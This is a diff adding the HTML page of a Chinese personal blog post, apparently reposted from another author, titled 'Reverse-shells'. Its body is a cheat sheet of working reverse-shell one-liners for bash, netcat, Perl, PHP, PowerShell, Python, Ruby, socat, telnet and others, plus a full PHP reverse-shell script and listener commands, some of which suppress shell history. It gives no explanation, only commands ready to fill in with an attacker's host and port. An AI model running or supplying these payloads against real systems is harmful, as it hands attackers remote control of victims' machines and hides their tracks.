@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="Kuiba's blog" type="application/atom+xml" />
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>Reverse-shells | Kuiba's blog - Listen to your own voice</title>
+  <meta name="generator" content="Hexo 4.2.1"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">Kuiba's blog</a></h1>
+        <h2 class="subtitle">Listen to your own voice</h2>
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/">技术水文</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/">转载搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/HTB%E6%90%AC%E8%BF%90/">HTB搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://kuibarj.top/posts/8a802f59.html">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Kuiba">
+       <meta itemprop="description" content="这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。">
+       <meta itemprop="image" content="/images/avatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Kuiba's blog">
+      </span>
+    </div>
+
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">Reverse-shells</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-04-05T20:03:33+08:00">2019-04-05 20:03:33</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/" itemprop="url" rel="index"><span itemprop="name">转载搬运</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1jk1rarys3KVjSZFnq6xFzpXaZ.jpg"></p>
+<a id="more"></a>
+<p>常用反弹shell姿势</p>
+<p>原文作者：<a href="https://alamot.github.io/reverse_shells/" target="_blank" rel="noopener">Antonios Tsolis</a></p>
+<h2 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">'BEGIN &#123;s = "/inet/tcp/0/LHOST/LPORT"; while(42) &#123; do&#123; printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != "exit") close(s); &#125;&#125;'</span> /dev/null<br></code></pre></td></tr></table></figure>
+
+<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/LOST/LPORT 0&gt;&amp;1<br><br>0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/LHOST/LPORT; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br><br><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/LHOST/LPORT &amp;&amp; <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line 0&lt;&amp;5; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r = Runtime.getRuntime(); p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/LHOST/LPORT;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[]); p.waitFor()<br></code></pre></td></tr></table></figure>
+
+<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="#Netcat"></a>#Netcat</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash LHOST LPORT<br><br>/bin/bash|nc LHOST LPORT<br><br>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc LHOST LPORT &gt;/tmp/f<br><br>rm -f backpipe; mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc LHOST LPORT 1&gt;/tmp/backpipe<br><br>rm -f backpipe; mknod /tmp/backpipe p &amp;&amp; nc LHOST LPORT 0&lt;backpipe | /bin/bash 1&gt;backpipe<br></code></pre></td></tr></table></figure>
+
+<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Windows</strong></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">'$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);shell_exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);`/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);system("/bin/bash -i &lt;&amp;3 &gt;&amp; 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);popen("/bin/bash -i &lt;&amp;3 &gt;&amp; 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure>
+
+<p>php写成一行</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php set_time_limit (0); <span class="hljs-variable">$VERSION</span> = <span class="hljs-string">"1.0"</span>; <span class="hljs-variable">$ip</span> = <span class="hljs-string">"LHOST"</span>; <span class="hljs-variable">$port</span> = LPORT; <span class="hljs-variable">$chunk_size</span> = 1400; <span class="hljs-variable">$write_a</span> = null; <span class="hljs-variable">$error_a</span> = null; <span class="hljs-variable">$shell</span> = <span class="hljs-string">"uname -a; w; id; /bin/bash -i"</span>; <span class="hljs-variable">$daemon</span> = 0; <span class="hljs-variable">$debug</span> = 0; <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">"pcntl_fork"</span>)) &#123; <span class="hljs-variable">$pid</span> = pcntl_fork(); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -1) &#123; printit(<span class="hljs-string">"ERROR: Cannot fork"</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123; <span class="hljs-built_in">exit</span>(0); &#125; <span class="hljs-keyword">if</span> (posix_setsid() == -1) &#123; printit(<span class="hljs-string">"Error: Cannot setsid()"</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-variable">$daemon</span> = 1; &#125; <span class="hljs-keyword">else</span> &#123; printit(<span class="hljs-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>); &#125; <span class="hljs-built_in">chdir</span>(<span class="hljs-string">"/"</span>); <span class="hljs-built_in">umask</span>(0); <span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30); <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123; printit(<span class="hljs-string">"<span class="hljs-variable">$errstr</span> (<span class="hljs-variable">$errno</span>)"</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-variable">$descriptorspec</span> = array(0 =&gt; array(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>), 1 =&gt; array(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>), 2 =&gt; array(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)); <span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>); <span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) &#123; printit(<span class="hljs-string">"ERROR: Cannot spawn shell"</span>); <span class="hljs-built_in">exit</span>(1); &#125; stream_set_blocking(<span class="hljs-variable">$pipes</span>[0], 0); stream_set_blocking(<span class="hljs-variable">$pipes</span>[1], 0); stream_set_blocking(<span class="hljs-variable">$pipes</span>[2], 0); stream_set_blocking(<span class="hljs-variable">$sock</span>, 0); printit(<span class="hljs-string">"Successfully opened reverse shell to <span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span>"</span>); <span class="hljs-keyword">while</span> (1) &#123; <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) &#123; printit(<span class="hljs-string">"ERROR: Shell connection terminated"</span>); <span class="hljs-built_in">break</span>; &#125; <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[1])) &#123; printit(<span class="hljs-string">"ERROR: Shell process terminated"</span>); <span class="hljs-built_in">break</span>; &#125; <span class="hljs-variable">$read_a</span> = array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$pipes</span>[2]); <span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, null); <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK READ"</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK: <span class="hljs-variable">$input</span>"</span>); fwrite(<span class="hljs-variable">$pipes</span>[0], <span class="hljs-variable">$input</span>); &#125; <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT READ"</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT: <span class="hljs-variable">$input</span>"</span>); fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>); &#125; <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR READ"</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR: <span class="hljs-variable">$input</span>"</span>); fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>); &#125; &#125; fclose(<span class="hljs-variable">$sock</span>); fclose(<span class="hljs-variable">$pipes</span>[0]); fclose(<span class="hljs-variable">$pipes</span>[1]); fclose(<span class="hljs-variable">$pipes</span>[2]); proc_close(<span class="hljs-variable">$process</span>); <span class="hljs-keyword">function</span> printit (<span class="hljs-variable">$string</span>) &#123;  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123; <span class="hljs-built_in">print</span> <span class="hljs-string">"<span class="hljs-variable">$string</span>\\n"</span>; &#125; &#125; ?&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="hljs-string">'LHOST'</span>,LPORT); <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream(); [byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;; <span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0) &#123;; <span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>); <span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String ); <span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">'PS '</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">'&gt; '</span>; <span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>); <span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length); <span class="hljs-variable">$stream</span>.Flush()&#125;; <span class="hljs-variable">$client</span>.Close();<br></code></pre></td></tr></table></figure>
+
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p><strong>TCP</strong></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>STCP</strong></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>UDP</strong></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();"</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Windows</strong></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">'c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT<br></code></pre></td></tr></table></figure>
+
+<h2 id="TCLsh"><a href="#TCLsh" class="headerlink" title="TCLsh"></a>TCLsh</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'set s [socket LHOST LPORT];while 42 &#123; puts -nonewline $s "shell&gt;";flush $s;gets $s c;set e "exec $c";if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;'</span> | tclsh<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet LHOST LPORT 0/tmp/p<br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT<br></code></pre></td></tr></table></figure>
+
+<h2 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">xhost +RHOST<br>xterm -display LHOST:0 or DISPLAY=LHOST: xterm<br></code></pre></td></tr></table></figure>
+
+<h2 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat file:`tty`,<span class="hljs-built_in">echo</span>=0,raw tcp-listen:LPORT<br>nc -lvvp LPORT<br></code></pre></td></tr></table></figure>
+
+    </main>
+    <div class="copy">
+      
+        
+  <br/>
+  <div style="text-align:center;color:#ccc;font-size:14px;">
+    ------ 本文结束 ------
+  </div>
+  <br/>
+  <div class="my_post_copyright" style="border:1px solid black;background-color:#f9f9f9">
+  	<div style="margin-left:24px">
+  	  <script src="https:////cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  	  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  	  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  	  <p><span>本文标题:</span><a href="/posts/8a802f59.html">Reverse-shells</a></p>
+  	  <p><span>文章作者:</span><a href="/" title="访问 Kuiba 的个人博客">Kuiba</a></p>
+  	  <p><span>发布时间:</span>2019年04月05日 - 20:04</p>
+  	  <!--<p><span>最后更新:</span>2019年05月27日 - 18:05</p>-->
+  	  <p><span>原始链接:</span><a href="/posts/8a802f59.html" title="Reverse-shells">https://kuibarj.top/posts/8a802f59.html</a>
+  	    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kuibarj.top/posts/8a802f59.html"  aria-label="复制成功！"></i></span>
+  	  </p>
+  	  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">Attribution-NonCommercial-NoDerivatives 4.0</a> 转载请保留原文链接及作者。</p>  
+  	</div>
